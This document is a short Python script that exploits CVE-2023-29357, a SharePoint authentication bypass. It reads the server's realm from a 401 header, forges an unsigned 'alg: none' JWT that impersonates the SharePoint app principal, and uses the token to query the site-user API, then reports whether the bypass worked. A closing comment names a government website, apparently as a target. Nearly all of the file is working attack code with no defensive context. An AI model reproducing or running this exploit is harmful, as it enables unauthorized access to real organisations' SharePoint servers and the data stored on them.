import requests
import json
import re
import time
import base64

def LeakRealm(url):
    header = {
        "Authorization": "Bearer "
    }
    response = requests.get(url + '/_api/web/curentuser', headers=header, verify=False, timeout=3)

    if response.status_code != 401:
        return 0
    
    Authenticate = response.headers.get('Www-Authenticate')
    pattern = r'realm="([^"]+)"'
    matches = re.search(pattern, Authenticate)
    if matches:
        realm = matches.group(1)
        return realm
    else:
        return 0
    
def createJwt(realm):
    header = {
        "alg": "none",
        "typ": "JWT"
    }
    current_time = int(time.time())
    expiration_time = current_time + 3600

    payload = {
        "aud": f"00000003-0000-0ff1-ce00-000000000000@{realm}",
        "iss": "00000003-0000-0ff1-ce00-000000000000",
        "nbf": int(current_time),
        "exp": int(expiration_time),
        "ver": "hashedprooftoken",
        "nameid": f"00000003-0000-0ff1-ce00-000000000000@{realm}",
        "endpointurl": "qqlAJmTxpB9A67xSyZk+tmrrNmYClY/fqig7ceZNsSM=",
        "endpointurlLength": 1,
        "isloopback": True
    }

    encode_header = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=')
    encode_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=')
    jwt_token = f"{encode_header.decode()}.{encode_payload.decode()}.AAA"
    return jwt_token

def getUser(url, jwt_token):
    header = {
        "Authorization": f"Bearer {jwt_token}",
        "Accept": "application/json",
        "X-PROOF_TOKEN": jwt_token
    }

    response = requests.get(url + '/_api/web/siteuser', verify=False, headers=header, timeout=3)
    if response.status_code != 200:
        print("[*] Don't bypass with CVE-2023-29357")
    else:
        print("[*] Bypass successfully with CVE-2023-29357")

url = input("URL: ")
realm = LeakRealm(url)
if realm != 0:
    print(f'[*] Realm: {realm}')
    token = createJwt(realm)
    print(f'[*] Token: {token}')
    getUser(url, token)
else:
    print('[*] Host clean with CVE-2023-29357')
# https://honglinh.hatinh.gov.vn/